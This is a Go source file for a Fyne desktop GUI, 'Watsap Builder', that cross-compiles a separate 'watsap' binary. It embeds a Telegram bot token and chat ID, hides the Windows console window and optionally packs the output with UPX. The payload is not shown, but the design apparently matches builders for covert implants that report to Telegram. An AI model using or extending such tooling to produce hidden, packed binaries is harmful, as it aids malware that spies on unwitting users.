package main

import (
	"log"
	"os/exec"
	"strings"
	"sync"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/data/binding"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/widget"
)

func builder(arch string, buildType string, platform string, compressionEnabled bool, compressionLevel string, botToken string, chatID string, output binding.String) {
	var outputText strings.Builder
	var mu sync.Mutex

	updateOutput := func(newText string) {
		mu.Lock()
		defer mu.Unlock()
		outputText.WriteString(newText)
		output.Set(outputText.String())
	}

	updateOutput("Building...\n")

	var cmd *exec.Cmd
	var command string

	// Common flags
	commonFlags := "-X 'watsap/utils/config.DEBUG_STATUS=0' -X 'watsap/utils/config.TG_BOT_TOKEN=" + botToken + "' -X 'watsap/utils/config.TG_CHAT_ID=" + chatID + "'"
	debugFlags := commonFlags
	releaseFlags := commonFlags + " -w -s"
	win_releaseFlags := commonFlags + " -w -s -H=windowsgui"

	var build_linux, build_windows string

	if buildType == "Release" {
		build_linux = "GOOS=linux GOARCH=" + arch + " go build -ldflags '" + releaseFlags + "' -o ../dist/watsap-linux-" + arch + ".bin ."
		build_windows = "GOOS=windows GOARCH=" + arch + " go build -ldflags '" + win_releaseFlags + "' -o ../dist/watsap-windows-" + arch + ".exe ."
	} else { // Debug
		build_linux = "GOOS=linux GOARCH=" + arch + " go build -ldflags '" + debugFlags + "' -o ../dist/watsap-linux-" + arch + "-debug.bin ."
		build_windows = "GOOS=windows GOARCH=" + arch + " go build -ldflags '" + debugFlags + "' -o ../dist/watsap-windows-" + arch + "-debug.exe ."
	}

	// Build Linux
	if platform == "Linux" || platform == "All" {
		updateOutput("Building for Linux...\n")
		command = build_linux
		cmd = exec.Command("bash", "-c", command)
		cmd.Dir = "../watsap" // run from watsap directory
		out, err := cmd.CombinedOutput()
		if err != nil {
			updateOutput("Linux build failed: " + err.Error() + "\n")
			updateOutput(string(out) + "\n")
		} else {
			updateOutput("Linux build successful.\n")
			updateOutput(string(out) + "\n")
		}
	}

	// Build Windows
	if platform == "Windows" || platform == "All" {
		updateOutput("Building for Windows...\n")
		command = build_windows
		cmd = exec.Command("bash", "-c", command)
		cmd.Dir = "../watsap" // run from watsap directory
		out, err := cmd.CombinedOutput()
		if err != nil {
			updateOutput("Windows build failed: " + err.Error() + "\n")
			updateOutput(string(out) + "\n")
		} else {
			updateOutput("Windows build successful.\n")
			updateOutput(string(out) + "\n")
		}
	}

	if buildType == "Release" && compressionEnabled {
		updateOutput("Compressing binaries...\n")
		var upxCmd []string
		if compressionLevel == "ultra-brute" {
			upxCmd = append(upxCmd, "-9", "-q", "-f", "--ultra-brute", "--no-owner")
		} else {
			upxCmd = append(upxCmd, "-"+compressionLevel, "-q", "-f", "--no-owner")
		}

		if platform == "Windows" || platform == "All" {
			upxCmd = append(upxCmd, "../dist/watsap-windows-"+arch+".exe")
		}
		if platform == "Linux" || platform == "All" {
			upxCmd = append(upxCmd, "../dist/watsap-linux-"+arch+".bin")
		}

		cmd = exec.Command("upx", upxCmd...)
		out, err := cmd.CombinedOutput()
		if err != nil {
			updateOutput("Compression failed: " + err.Error() + "\n")
			updateOutput(string(out) + "\n")
			return
		}
		updateOutput("Compression successful.\n")
		updateOutput(string(out) + "\n")
	}

	updateOutput("Build complete!")
}

func main() {
	a := app.New()
	w := a.NewWindow("Watsap Builder")
	w.Resize(fyne.NewSize(600, 480))
	w.SetFixedSize(true)

	title := widget.NewLabel("Watsap Builder")
	title.Alignment = fyne.TextAlignCenter

	// Create about button
	aboutButton := widget.NewButton("About", func() {
		aboutContent := widget.NewRichTextFromMarkdown(`
# Watsap Builder

A GUI application for building Watsap binaries with custom configurations.

## Features
- Cross-platform builds (Linux, Windows)
- Multiple architectures (amd64, i386, arm64)
- Build type selection (Release, Debug)
- Binary compression with UPX
- Real-time build logs

## Requirements
- Go compiler
- UPX (optional, for compression)

## Version
1.0.0

Built with ♿ using Fyne
		`)
		aboutContent.Wrapping = fyne.TextWrapWord

		aboutDialog := dialog.NewCustom("About Watsap Builder", "Close", aboutContent, w)
		aboutDialog.Resize(fyne.NewSize(400, 300))
		aboutDialog.Show()
	})
	aboutButton.Resize(fyne.NewSize(60, 30))

	// Create top bar with title and about button
	topBar := container.NewBorder(nil, nil, nil, aboutButton, title)

	arch := "amd64"
	archRadio := widget.NewRadioGroup([]string{"amd64", "i386", "arm64"}, func(s string) {
		arch = s
	})
	archRadio.Horizontal = true
	archRadio.SetSelected("amd64")

	buildType := "Release"
	buildTypeRadio := widget.NewRadioGroup([]string{"Release", "Debug"}, func(s string) {
		buildType = s
	})
	buildTypeRadio.Horizontal = true
	buildTypeRadio.SetSelected("Release")

	platform := "All"
	platformRadio := widget.NewRadioGroup([]string{"All", "Linux", "Windows"}, func(s string) {
		platform = s
	})
	platformRadio.Horizontal = true
	platformRadio.SetSelected("All")

	botTokenEntry := widget.NewPasswordEntry()
	botTokenEntry.SetPlaceHolder("Enter bot token")

	chatIDEntry := widget.NewEntry()
	chatIDEntry.SetPlaceHolder("Enter chat ID")

	compressionEnabled := false
	compressionLevel := "ultra-brute"

	compressionLevelSelect := widget.NewSelect([]string{"1", "2", "3", "4", "5", "6", "7", "8", "9", "ultra-brute"}, func(selected string) {
		compressionLevel = selected
	})
	compressionLevelSelect.SetSelected("ultra-brute")
	compressionLevelSelect.Disable()

	compressionCheck := widget.NewCheck("Enable Compression", func(checked bool) {
		compressionEnabled = checked
		if checked {
			compressionLevelSelect.Enable()
		} else {
			compressionLevelSelect.Disable()
		}
	})

	logBinding := binding.NewString()
	logBinding.Set("Build logs will appear here.")
	logOutput := widget.NewRichTextFromMarkdown("")
	logOutput.Wrapping = fyne.TextWrapWord

	// Update the log output when binding changes
	logBinding.AddListener(binding.NewDataListener(func() {
		text, _ := logBinding.Get()
		logOutput.ParseMarkdown("```\n" + text + "\n```")
	}))

	logScroll := container.NewVScroll(logOutput)
	logScroll.SetMinSize(fyne.NewSize(0, 200))

	// Create copy button for logs
	copyButton := widget.NewButton("Copy Logs", func() {
		text, _ := logBinding.Get()
		w.Clipboard().SetContent(text)
	})
	copyButton.Resize(fyne.NewSize(80, 30))

	// Create build button
	buildButton := widget.NewButton("Build", func() {
		// Validate required fields
		if strings.TrimSpace(botTokenEntry.Text) == "" {
			dialog.ShowInformation("Error", "Bot Token is required!", w)
			return
		}
		if strings.TrimSpace(chatIDEntry.Text) == "" {
			dialog.ShowInformation("Error", "Chat ID is required!", w)
			return
		}

		go builder(arch, buildType, platform, compressionEnabled, compressionLevel, botTokenEntry.Text, chatIDEntry.Text, logBinding)
	})
	buildButton.Importance = widget.HighImportance

	// Container for buttons
	buttonContainer := container.NewVBox(buildButton, copyButton)

	// Container for logs with buttons
	logsContainer := container.NewBorder(nil, buttonContainer, nil, nil, logScroll)

	form := &widget.Form{
		Items: []*widget.FormItem{
			{Text: "Bot Token", Widget: botTokenEntry},
			{Text: "Chat ID", Widget: chatIDEntry},
			{Text: "Architecture", Widget: archRadio},
			{Text: "Build Type", Widget: buildTypeRadio},
			{Text: "Platform", Widget: platformRadio},
			{Text: "", Widget: compressionCheck},
			{Text: "Compression Level", Widget: compressionLevelSelect},
		},
	}

	// Check for dependencies
	go func() {
		_, err := exec.LookPath("go")
		if err != nil {
			log.Println("Go is not installed. Please install it from https://golang.org/dl/")
		}
		_, err = exec.LookPath("upx")
		if err != nil {
			log.Println("upx is not installed. Please install it from https://upx.github.io/")
		}
	}()

	centeredForm := container.NewHBox(layout.NewSpacer(), form, layout.NewSpacer())
	top := container.NewVBox(topBar, centeredForm)

	w.SetContent(container.NewBorder(top, nil, nil, nil, logsContainer))

	w.ShowAndRun()
}
